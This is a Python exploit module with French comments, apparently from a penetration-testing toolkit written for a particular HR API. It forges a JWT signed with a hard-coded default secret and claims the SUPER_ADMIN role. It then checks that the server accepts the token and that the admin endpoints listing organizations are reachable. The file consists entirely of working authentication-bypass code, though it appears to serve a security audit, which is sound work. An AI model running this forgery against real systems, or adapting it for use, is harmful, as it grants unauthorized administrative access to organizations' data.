"""HRAPI-2026-010 — forge d'un jeton avec le secret JWT par defaut."""

from __future__ import annotations
import base64
import hashlib
import hmac
import json
import time
from .base import Module, Option, Context


def _b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge_hs256(payload: dict, secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    segs = _b64(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        _b64(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), segs.encode(), hashlib.sha256).digest()
    return segs + "." + _b64(sig)


class Exploit(Module):
    id = "HRAPI-2026-010"
    name = "auth/forge_token_default_secret"
    cwe = "CWE-798"
    cvss = "9.8 (Critique)"
    description = (
        "Si JWT_ACCESS_SECRET n'est pas defini, env.ts retombe sur une valeur "
        "codee en dur ('dev-access-secret-change-me'), aussi utilisee par le "
        "docker-compose. On forge alors hors-ligne un jeton d'acces en "
        "choisissant le role. 'sub' doit viser un utilisateur actif existant."
    )
    options = {
        "secret": Option(default="dev-access-secret-change-me", help="secret JWT suppose"),
        "role": Option(default="SUPER_ADMIN", help="role a inscrire dans le jeton"),
        "sub": Option(help="id utilisateur actif (sinon celui de la session)"),
        "org": Option(help="organizationId a inscrire (sinon celui de la session)"),
    }

    def run(self, ctx: Context) -> bool:
        sub = self.opt(ctx.store, "sub") or ctx.store.get("USER_ID")
        org = self.opt(ctx.store, "org") or ctx.store.get("SESSION_ORG")
        if not sub:
            ctx.fail("Il faut un 'sub' (id utilisateur actif). 'set sub <id>' ou lance 001.")
            return False

        now = int(time.time())
        payload = {
            "sub": sub,
            "organizationId": org or "00000000-0000-0000-0000-000000000000",
            "email": ctx.store.get("EMAIL", "forged@example.test"),
            "role": self.opt(ctx.store, "role"),
            "sessionId": "forged",
            "type": "access",
            "iat": now,
            "exp": now + 900,
        }
        token = forge_hs256(payload, self.opt(ctx.store, "secret"))
        ctx.ok(f"Jeton forge hors-ligne (role={payload['role']}) :")
        ctx.line(f"      {token[:60]}...")

        # Verification cote serveur : /auth/me accepte-t-il le jeton forge ?
        me = ctx.client.me(token)
        if me.get("id"):
            ctx.ok(f"Jeton accepte par le serveur. Identite: {me.get('email')}")
            orgs = ctx.client.list_organizations(token)
            if orgs:
                ctx.ok(f"Endpoint SUPER_ADMIN accessible avec le jeton forge : {len(orgs)} org.")
            ctx.store["ACCESS"] = token
            return True
        ctx.fail("Jeton refuse : le serveur utilise probablement un secret fort (bien).")
        return False
